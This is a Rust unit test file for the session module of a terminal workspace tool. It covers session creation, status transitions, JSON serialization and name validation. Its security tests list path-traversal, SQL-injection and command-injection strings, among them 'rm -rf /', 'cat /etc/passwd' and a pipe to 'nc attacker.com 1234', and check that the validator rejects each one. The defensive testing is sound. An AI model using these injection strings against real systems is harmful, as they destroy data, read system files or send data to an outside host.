//! Tests for session module

use zjj_core::Result;

use crate::session::{
    status::SessionStatus,
    types::{Session, SessionUpdate},
    validation::{validate_session_name, validate_status_transition},
};

#[test]
fn test_session_new_valid() -> Result<()> {
    let session = Session::new("my-session", "/path/to/workspace")?;
    assert_eq!(session.name, "my-session");
    assert_eq!(session.zellij_tab, "zjj:my-session");
    assert_eq!(session.status, SessionStatus::Creating);
    assert!(session.id.is_none());
    assert!(session.created_at > 0);
    assert_eq!(session.created_at, session.updated_at);
    Ok(())
}

#[test]
fn test_session_name_empty() {
    let result = validate_session_name("");
    assert!(result.is_err());
}

#[test]
fn test_session_name_whitespace_only_spaces() {
    let result = validate_session_name("   ");
    assert!(result.is_err());
    let error = if let Err(e) = result {
        e.to_string()
    } else {
        String::from("UNEXPECTED_OK")
    };
    assert!(error.contains("cannot be empty or whitespace-only"));
    assert!(error.contains("Examples:"));
}

#[test]
fn test_session_name_whitespace_only_tabs() {
    let result = validate_session_name("\t\t");
    assert!(result.is_err());
    assert!(if let Err(e) = result {
        e.to_string()
    } else {
        String::from("UNEXPECTED_OK")
    }
    .contains("cannot be empty or whitespace-only"));
}

#[test]
fn test_session_name_whitespace_only_newlines() {
    let result = validate_session_name("\n");
    assert!(result.is_err());
    assert!(if let Err(e) = result {
        e.to_string()
    } else {
        String::from("UNEXPECTED_OK")
    }
    .contains("cannot be empty or whitespace-only"));
}

#[test]
fn test_session_name_whitespace_only_mixed() {
    let result = validate_session_name("  \t  \n  ");
    assert!(result.is_err());
    assert!(if let Err(e) = result {
        e.to_string()
    } else {
        String::from("UNEXPECTED_OK")
    }
    .contains("cannot be empty or whitespace-only"));
}

#[test]
fn test_session_name_too_long() {
    let long_name = "a".repeat(256);
    let result = validate_session_name(&long_name);
    assert!(result.is_err());
    assert!(if let Err(e) = result {
        e.to_string()
    } else {
        String::from("UNEXPECTED_OK")
    }
    .contains("too long"));
}

#[test]
fn test_session_name_invalid_chars() {
    let result = validate_session_name("my session");
    assert!(result.is_err());
}

#[test]
fn test_session_name_starts_with_dash() {
    let result = validate_session_name("-session");
    assert!(result.is_err());
}

#[test]
fn test_session_name_valid_with_underscore() {
    let result = validate_session_name("my_session");
    assert!(result.is_ok());
}

#[test]
fn test_session_name_starts_with_underscore_rejected() {
    let result = validate_session_name("_session");
    assert!(result.is_err());
}

#[test]
fn test_session_name_starts_with_digit_rejected() {
    let result = validate_session_name("1session");
    assert!(result.is_err());
}

#[test]
fn test_session_name_unicode_rejected() {
    // Test various unicode characters that might look like ASCII
    let unicode_names = vec![
        "session\u{0301}", // Combining accent
        "sessi\u{00F6}n",  // ö (latin small letter o with diaeresis)
        "session\u{200B}", // Zero-width space
        "\u{0410}bcdef",   // Cyrillic A that looks like Latin A
        "abc\u{03B1}def",  // Greek alpha
    ];

    for name in unicode_names {
        let result = validate_session_name(name);
        assert!(result.is_err(), "Unicode name should be rejected: {name:?}");
    }
}

#[test]
fn test_session_name_reserved_default() {
    let result = validate_session_name("default");
    assert!(result.is_err());
    let error = if let Err(e) = result {
        e.to_string()
    } else {
        String::from("UNEXPECTED_OK")
    };
    assert!(
        error.contains("reserved"),
        "Error should mention reserved: {error}"
    );
}

#[test]
fn test_session_name_reserved_default_case_insensitive() {
    let reserved_variants = vec!["default", "Default", "DEFAULT", "DeFaUlT"];

    for name in reserved_variants {
        let result = validate_session_name(name);
        assert!(
            result.is_err(),
            "Reserved name '{name}' should be rejected regardless of case"
        );
        let error = if let Err(e) = result {
            e.to_string()
        } else {
            String::from("UNEXPECTED_OK")
        };
        assert!(
            error.contains("reserved"),
            "Error should mention reserved: {error}"
        );
    }
}

#[test]
fn test_session_name_reserved_root() {
    let result = validate_session_name("root");
    assert!(result.is_err());
    let error = if let Err(e) = result {
        e.to_string()
    } else {
        String::from("UNEXPECTED_OK")
    };
    assert!(
        error.contains("reserved"),
        "Error should mention reserved: {error}"
    );
}

#[test]
fn test_session_name_reserved_root_case_insensitive() {
    let reserved_variants = vec!["root", "Root", "ROOT", "RoOt"];

    for name in reserved_variants {
        let result = validate_session_name(name);
        assert!(
            result.is_err(),
            "Reserved name '{name}' should be rejected regardless of case"
        );
        let error = if let Err(e) = result {
            e.to_string()
        } else {
            String::from("UNEXPECTED_OK")
        };
        assert!(
            error.contains("reserved"),
            "Error should mention reserved: {error}"
        );
    }
}

#[test]
fn test_session_name_valid_patterns() {
    let valid_names = vec![
        "a",
        "A",
        "session",
        "Session",
        "my-session",
        "my_session",
        "my-long-session-name",
        "session123",
        "a1b2c3",
        "ABC123",
        "Feature-Branch_123",
    ];

    for name in valid_names {
        let result = validate_session_name(name);
        assert!(result.is_ok(), "Valid name rejected: {name}");
    }
}

#[test]
fn test_session_status_display() {
    assert_eq!(SessionStatus::Creating.to_string(), "creating");
    assert_eq!(SessionStatus::Active.to_string(), "active");
    assert_eq!(SessionStatus::Paused.to_string(), "paused");
    assert_eq!(SessionStatus::Completed.to_string(), "completed");
    assert_eq!(SessionStatus::Failed.to_string(), "failed");
}

#[test]
fn test_session_status_from_str() {
    assert!(matches!("creating".parse(), Ok(SessionStatus::Creating)));
    assert!(matches!("active".parse(), Ok(SessionStatus::Active)));
    assert!(matches!("paused".parse(), Ok(SessionStatus::Paused)));
    assert!(matches!("completed".parse(), Ok(SessionStatus::Completed)));
    assert!(matches!("failed".parse(), Ok(SessionStatus::Failed)));

    let result: Result<SessionStatus> = "invalid".parse();
    assert!(result.is_err());
}

#[test]
fn test_session_status_default() {
    let status: SessionStatus = SessionStatus::default();
    assert_eq!(status, SessionStatus::Creating);
}

#[test]
fn test_session_update_default() {
    let update: SessionUpdate = SessionUpdate::default();
    assert!(update.status.is_none());
    assert!(update.branch.is_none());
    assert!(update.last_synced.is_none());
    assert!(update.metadata.is_none());
}

#[test]
fn test_status_transition_creating_to_active() {
    let result = validate_status_transition(SessionStatus::Creating, SessionStatus::Active);
    assert!(result.is_ok());
}

#[test]
fn test_status_transition_creating_to_failed() {
    let result = validate_status_transition(SessionStatus::Creating, SessionStatus::Failed);
    assert!(result.is_ok());
}

#[test]
fn test_status_transition_active_to_paused() {
    let result = validate_status_transition(SessionStatus::Active, SessionStatus::Paused);
    assert!(result.is_ok());
}

#[test]
fn test_status_transition_active_to_completed() {
    let result = validate_status_transition(SessionStatus::Active, SessionStatus::Completed);
    assert!(result.is_ok());
}

#[test]
fn test_status_transition_paused_to_active() {
    let result = validate_status_transition(SessionStatus::Paused, SessionStatus::Active);
    assert!(result.is_ok());
}

#[test]
fn test_status_transition_completed_to_active() {
    let result = validate_status_transition(SessionStatus::Completed, SessionStatus::Active);
    assert!(result.is_ok());
}

#[test]
fn test_status_transition_failed_to_creating() {
    let result = validate_status_transition(SessionStatus::Failed, SessionStatus::Creating);
    assert!(result.is_ok());
}

#[test]
fn test_status_transition_invalid_creating_to_paused() {
    let result = validate_status_transition(SessionStatus::Creating, SessionStatus::Paused);
    assert!(result.is_err());
}

#[test]
fn test_status_transition_invalid_active_to_creating() {
    let result = validate_status_transition(SessionStatus::Active, SessionStatus::Creating);
    assert!(result.is_err());
}

#[test]
fn test_status_transition_invalid_completed_to_failed() {
    let result = validate_status_transition(SessionStatus::Completed, SessionStatus::Failed);
    assert!(result.is_err());
}

#[test]
fn test_session_serialization() -> Result<()> {
    let session = Session::new("test", "/path")?;
    let json = serde_json::to_string(&session)
        .map_err(|e| zjj_core::Error::Unknown(format!("Serialization failed: {e}")))?;
    assert!(json.contains("\"name\":\"test\""));
    assert!(json.contains("\"status\":\"creating\""));
    Ok(())
}

#[test]
fn test_session_deserialization() -> Result<()> {
    let json = r#"{
        "name": "test",
        "status": "active",
        "workspace_path": "/path",
        "zellij_tab": "zjj:test",
        "created_at": 1000,
        "updated_at": 1000
    }"#;

    let session: Session = serde_json::from_str(json)
        .map_err(|e| zjj_core::Error::Unknown(format!("Deserialization failed: {e}")))?;

    assert_eq!(session.name, "test");
    assert_eq!(session.status, SessionStatus::Active);
    assert_eq!(session.workspace_path, "/path");
    assert!(session.id.is_none());
    Ok(())
}

#[test]
fn test_session_round_trip_serialization() -> Result<()> {
    let original = Session::new("test", "/path")?;
    let json = serde_json::to_string(&original)
        .map_err(|e| zjj_core::Error::Unknown(format!("Serialization failed: {e}")))?;
    let deserialized: Session = serde_json::from_str(&json)
        .map_err(|e| zjj_core::Error::Unknown(format!("Deserialization failed: {e}")))?;

    assert_eq!(original.name, deserialized.name);
    assert_eq!(original.status, deserialized.status);
    assert_eq!(original.workspace_path, deserialized.workspace_path);
    assert_eq!(original.zellij_tab, deserialized.zellij_tab);
    Ok(())
}

#[test]
fn test_session_optional_fields_omitted() -> Result<()> {
    let session = Session::new("test", "/path")?;
    let json = serde_json::to_string(&session)
        .map_err(|e| zjj_core::Error::Unknown(format!("Serialization failed: {e}")))?;

    // Optional None fields should not appear in JSON
    assert!(!json.contains("\"id\""));
    assert!(!json.contains("\"branch\""));
    assert!(!json.contains("\"last_synced\""));
    assert!(!json.contains("\"metadata\""));
    Ok(())
}

#[test]
fn test_status_serialization() {
    let status = SessionStatus::Active;
    let json = serde_json::to_string(&status);
    assert!(json.is_ok());
    assert_eq!(json.as_ref().ok(), Some(&"\"active\"".to_string()));
}

#[test]
fn test_status_deserialization() {
    let json = "\"active\"";
    let status = serde_json::from_str::<SessionStatus>(json);
    assert!(status.is_ok());
    assert_eq!(status.ok(), Some(SessionStatus::Active));
}

// Edge cases and boundary tests

#[test]
fn test_session_name_exactly_255_chars() {
    let name = format!("a{}", "b".repeat(254));
    let result = validate_session_name(&name);
    assert!(result.is_ok());
}

#[test]
fn test_session_name_exactly_256_chars_rejected() {
    let name = format!("a{}", "b".repeat(255));
    assert_eq!(name.len(), 256);
    let result = validate_session_name(&name);
    assert!(result.is_err());
    let error = if let Err(e) = result {
        e.to_string()
    } else {
        String::from("UNEXPECTED_OK")
    };
    assert!(
        error.contains("too long"),
        "Error should mention length limit: {error}"
    );
}

#[test]
fn test_session_name_special_chars_rejected() {
    let invalid_chars = vec!["!", "@", "#", "$", "%", "^", "&", "*", "(", ")", " ", ","];

    for special in invalid_chars {
        let name = format!("test{special}name");
        let result = validate_session_name(&name);
        assert!(
            result.is_err(),
            "Special char should be rejected: {special}"
        );
    }
}

#[test]
fn test_session_name_period_allowed() {
    let result = validate_session_name("test.session");
    assert!(result.is_ok(), "Period should be allowed in session names");
}

#[test]
fn test_session_name_cannot_start_with_period() {
    let result = validate_session_name(".session");
    assert!(result.is_err());
    assert!(if let Err(e) = result {
        e.to_string()
    } else {
        String::from("UNEXPECTED_OK")
    }
    .contains("must start with a letter"));
}

#[test]
fn test_session_with_metadata() -> Result<()> {
    let mut session = Session::new("test", "/path")?;
    session.metadata = Some(serde_json::json!({
        "priority": "high",
        "tags": ["feature", "backend"]
    }));

    let json = serde_json::to_string(&session)
        .map_err(|e| zjj_core::Error::Unknown(format!("Serialization failed: {e}")))?;
    assert!(json.contains("\"metadata\""));
    assert!(json.contains("\"priority\":\"high\""));
    Ok(())
}

#[test]
fn test_all_status_transitions_exhaustive() {
    use SessionStatus::{Active, Completed, Creating, Failed, Paused};

    let all_statuses = [Creating, Active, Paused, Completed, Failed];

    // Valid transitions
    let valid = vec![
        (Creating, Active),
        (Creating, Failed),
        (Active, Paused),
        (Active, Completed),
        (Active, Failed),
        (Paused, Active),
        (Paused, Failed),
        (Completed, Active),
        (Failed, Creating),
    ];

    for (from, to) in &valid {
        let result = validate_status_transition(*from, *to);
        assert!(
            result.is_ok(),
            "Expected valid transition from {from} to {to}"
        );
    }

    // Test all combinations and verify invalid ones are rejected
    for from in &all_statuses {
        for to in &all_statuses {
            let is_valid = valid.contains(&(*from, *to));
            let result = validate_status_transition(*from, *to);

            if is_valid {
                assert!(result.is_ok(), "Transition {from} -> {to} should be valid");
            } else {
                assert!(
                    result.is_err(),
                    "Transition {from} -> {to} should be invalid"
                );
            }
        }
    }
}

// Security tests for dangerous input patterns

#[test]
fn test_session_name_path_traversal_rejected() {
    let dangerous_names = vec![
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "session/../etc",
        "session..parent",
    ];

    for name in dangerous_names {
        let result = validate_session_name(name);
        assert!(
            result.is_err(),
            "Path traversal pattern should be rejected: {name}"
        );
        // All of these should be rejected either for:
        // - Starting with non-letter (../, ..\)
        // - Containing path traversal sequences (..)
        // - Containing dangerous/invalid characters (/, \)
        let err_msg = if let Err(e) = result {
            e.to_string()
        } else {
            String::from("UNEXPECTED_OK")
        };
        assert!(
            err_msg.contains("path traversal")
                || err_msg.contains("must start with a letter")
                || err_msg.contains("dangerous character")
                || err_msg.contains("invalid characters"),
            "Error should mention path traversal, start requirement, or invalid/dangerous chars, got: {err_msg}"
        );
    }
}

#[test]
fn test_session_name_sql_injection_rejected() {
    let sql_injections = vec![
        "'; DROP TABLE sessions;--",
        "\" OR 1=1--",
        "admin'--",
        "1' OR '1'='1",
    ];

    for name in sql_injections {
        let result = validate_session_name(name);
        assert!(
            result.is_err(),
            "SQL injection pattern should be rejected: {name}"
        );
        let err_msg = if let Err(e) = result {
            e.to_string()
        } else {
            String::from("UNEXPECTED_OK")
        };
        assert!(
            err_msg.contains("invalid characters")
                || err_msg.contains("dangerous character")
                || err_msg.contains("must start with a letter"),
            "Error should mention invalid/dangerous characters, got: {err_msg}"
        );
    }
}

#[test]
fn test_session_name_command_injection_rejected() {
    let command_injections = vec![
        "$(whoami)",
        "`id`",
        "session; rm -rf /",
        "session && cat /etc/passwd",
        "session | nc attacker.com 1234",
        "session > /dev/null",
        "session < /etc/passwd",
    ];

    for name in command_injections {
        let result = validate_session_name(name);
        assert!(
            result.is_err(),
            "Command injection pattern should be rejected: {name}"
        );
        let err_msg = if let Err(e) = result {
            e.to_string()
        } else {
            String::from("UNEXPECTED_OK")
        };
        assert!(
            err_msg.contains("invalid characters")
                || err_msg.contains("dangerous character")
                || err_msg.contains("must start with a letter"),
            "Error should mention invalid/dangerous characters, got: {err_msg}"
        );
    }
}

#[test]
fn test_session_name_shell_metacharacters_rejected() {
    let shell_chars = vec![
        "session$var",
        "session`cmd`",
        "session|pipe",
        "session&background",
        "session;cmd2",
        "session<input",
        "session>output",
        "session(sub)",
        "session[array]",
        "session{brace}",
        "session\\escape",
        "session/slash",
        "session*glob",
        "session?wildcard",
    ];

    for name in shell_chars {
        let result = validate_session_name(name);
        assert!(
            result.is_err(),
            "Shell metacharacter should be rejected: {name}"
        );
    }
}

#[test]
fn test_session_name_control_characters_rejected() {
    let control_char_names = vec![
        "session\n",
        "session\r",
        "session\t",
        "session\0",
        "session\x00",
        "session\x1b",
    ];

    for name in control_char_names {
        let result = validate_session_name(name);
        assert!(
            result.is_err(),
            "Control character should be rejected: {name:?}"
        );
    }
}

#[test]
fn test_session_name_whitespace_only_rejected() {
    let whitespace_names = vec!["   ", "\t\t", "\n\n", " \t \n "];

    for name in whitespace_names {
        let result = validate_session_name(name);
        assert!(
            result.is_err(),
            "Whitespace-only name should be rejected: {name:?}"
        );
        let err_msg = if let Err(e) = result {
            e.to_string()
        } else {
            String::from("UNEXPECTED_OK")
        };
        assert!(
            err_msg.contains("cannot be empty"),
            "Error should mention empty name, got: {err_msg}"
        );
    }
}

#[test]
fn test_session_name_leading_trailing_whitespace_rejected() {
    let padded_names = vec![
        " session",
        "session ",
        " session ",
        "\tsession",
        "session\n",
    ];

    for name in padded_names {
        let result = validate_session_name(name);
        assert!(
            result.is_err(),
            "Name with leading/trailing whitespace should be rejected: {name:?}"
        );
        let err_msg = if let Err(e) = result {
            e.to_string()
        } else {
            String::from("UNEXPECTED_OK")
        };
        assert!(
            err_msg.contains("whitespace") || err_msg.contains("invalid characters"),
            "Error should mention whitespace, got: {err_msg}"
        );
    }
}

#[test]
fn test_session_name_very_long_input() {
    let very_long = "a".to_string() + &"b".repeat(10000);
    let result = validate_session_name(&very_long);
    assert!(result.is_err());
    let err_msg = if let Err(e) = result {
        e.to_string()
    } else {
        String::from("UNEXPECTED_OK")
    };
    assert!(
        err_msg.contains("too long"),
        "Error should mention length, got: {err_msg}"
    );
}

#[test]
fn test_session_name_unicode_emoji_rejected() {
    let unicode_names = vec!["session🚀", "café", "session名", "naïve", "München"];

    for name in unicode_names {
        let result = validate_session_name(name);
        assert!(result.is_err(), "Unicode/emoji should be rejected: {name}");
        let err_msg = if let Err(e) = result {
            e.to_string()
        } else {
            String::from("UNEXPECTED_OK")
        };
        assert!(
            err_msg.contains("ASCII"),
            "Error should mention ASCII requirement, got: {err_msg}"
        );
    }
}

#[test]
fn test_session_name_valid_with_multiple_periods() {
    let result = validate_session_name("test.feature.branch");
    assert!(result.is_ok(), "Multiple periods should be allowed");
}

#[test]
fn test_session_name_valid_with_mixed_separators() {
    let valid_names = vec![
        "test-feature",
        "test_feature",
        "test.feature",
        "test-feature_branch.v1",
        "myFeature-123_test.final",
    ];

    for name in valid_names {
        let result = validate_session_name(name);
        assert!(result.is_ok(), "Valid name rejected: {name}");
    }
}

#[test]
fn test_session_name_detailed_error_messages() {
    // Test that error messages list specific invalid characters
    let result = validate_session_name("test@#$name");
    assert!(result.is_err());
    let err_msg = if let Err(e) = result {
        e.to_string()
    } else {
        String::from("UNEXPECTED_OK")
    };
    // Should list the specific invalid characters found
    assert!(
        err_msg.contains("'@'") || err_msg.contains("'#'") || err_msg.contains("'$'"),
        "Error should list specific invalid characters, got: {err_msg}"
    );
}

#[test]
fn test_session_name_length_boundary_cases() {
    // Test boundary at 255 chars
    let at_limit = format!("a{}", "b".repeat(254));
    assert_eq!(at_limit.len(), 255);
    assert!(validate_session_name(&at_limit).is_ok());

    let over_limit = format!("a{}", "b".repeat(255));
    assert_eq!(over_limit.len(), 256);
    assert!(validate_session_name(&over_limit).is_err());

    // Test very short names
    assert!(validate_session_name("a").is_ok());
    assert!(validate_session_name("A").is_ok());
}
